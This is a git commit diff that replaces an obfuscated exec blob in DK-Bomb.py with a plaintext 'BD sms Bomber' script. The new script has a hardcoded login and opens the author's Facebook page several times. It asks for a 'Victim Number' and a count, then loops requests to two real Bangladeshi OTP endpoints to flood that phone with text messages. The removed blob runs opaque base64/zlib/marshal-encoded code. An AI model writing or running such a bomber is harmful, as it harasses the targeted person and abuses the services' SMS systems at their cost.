0a9b5442d5df42a1a5c269014acffabaae47df1d
Devil King <74169836+d3v1l-k1n9@users.noreply.github.com>
2022-02-16 20:15:16 +0600

    Update DK-Bomb.py

--- DK-Bomb.py
+++ DK-Bomb.py
@@ -1,6 +1,96 @@
-# Obfuscated by Py Compile
-# Created by HTR-TECH (https://github.com/htr-tech)
-# Instagram : @tahmid.rayat
+import os,sys,time,datetime
+import requests
+bl="\33[94m"
+re="\033[91m"
+li="\033[94m"
+w="\33[97m"
+y="\33[93m"
+g="\033[1;32m"
+cy="\033[96m"
+end="\033[0m"
 
-import marshal,zlib,base64
-exec(marshal.loads(zlib.decompress(base64.b64decode("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"))))
+
+
+os.system('clear')
+info="""    ╔===================================================╗
+    ║ [•] Author   => Devil King                        ║
+    ║ [•] Tool     => BD sms Bomber                     ║
+    ║ [•] GitHub   => https://www.github.com/d3v1l-k1n9 ║
+    ║ [•] Coded by => Monayem Hossain                   ║
+    ╚===================================================╝
+"""
+os.system("xdg-open https://www.facebook.com/DEVIL.KING.M0NAYEM")
+os.system("lolcat login.txt")
+print(y+info)
+
+name='MONAYEM'
+password='Devil King'
+
+usr=str(input(cy+"Username => "))
+print("  ")
+pas=str(input(g+"Password => "))
+
+if name==usr and password==pas:
+  print(g+"Login Successful ☑️")
+  time.sleep(2)
+  os.system('clear')
+  
+  pass 
+
+else:
+  print(re+"[×] Wrong Username or Password try agin ")
+  os.system("xdg-open https://www.facebook.com/DEVIL.KING.M0NAYEM"),
+  sys.exit()
+
+ 
+
+logo="""
+   █████╗ ██╗  ██╗        ██████╗  ██████╗ ███╗   ███╗██████╗ 
+   █╔══██╗██║ ██╔╝        ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗
+   █║  ██║█████╔╝   ████╗ ██████╔╝██║   ██║██╔████╔██║██████╔╝
+   █║  ██║██╔═██╗   ╚═══╝ ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗
+   █████╔╝██║  ██╗        ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝
+   ╚═════╝╚═╝  ╚═╝        ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ 
+                                                😈DEVIL KING😈
+================================================================                                                      
+"""
+os.system("xdg-open https://www.facebook.com/DEVIL.KING.M0NAYEM")
+print(cy+logo)
+
+print(w+"["+re+" 1."+w+"]"+g+"START" " " +cy+"BOM"+li+"BING  ")
+print(g)
+print(w+"["+re+" 2."+w+"]"+w+"E"+g+"X"+re+"I"+cy+"T")
+
+inp=str(input(g+"Enter"  +re+" Your"  +g+" Choice"+w+" => "))
+if inp=="2":
+        print("\n          ♥️♥️Thanks For Using My Tool♥️♥️"),
+        os.system("xdg-open https://www.facebook.com/DEVIL.KING.M0NAYEM"),
+        time.sleep(1),
+        exit()
+        
+        
+
+elif inp=='1':
+  time.sleep(2)
+  os.system('clear')
+  print(cy+logo),
+  
+  number=str(input(g+"\n Enter your Victim Number"+cy+"(without"+w+" +88 ) => "))
+  
+  amount=int(input(g+"        Enter amount =>  "))
+else:
+  print (re+"\n • Invalid Choice• \n • Try again •"),
+  exit()
+  pass
+  
+api="https://www.shwapno.com/WebAPI/CRMActivation/Validate?Channel=W&otpCRMrequired=false&otpeCOMrequired=true&smssndcnt=8&otpBasedLogin=false&LoyaltyProvider=&MobileNO="+number+"&countryPhoneCode=%2B88"
+url="https://ss.binge.buzz/otp/send/login"
+
+data={'phone':number}
+  
+for i in range(amount):
+  requests.get(api)
+  requests.post(url,data=data)
+  
+  print(str(i+1)+" Send Successfully ☑️")
+  
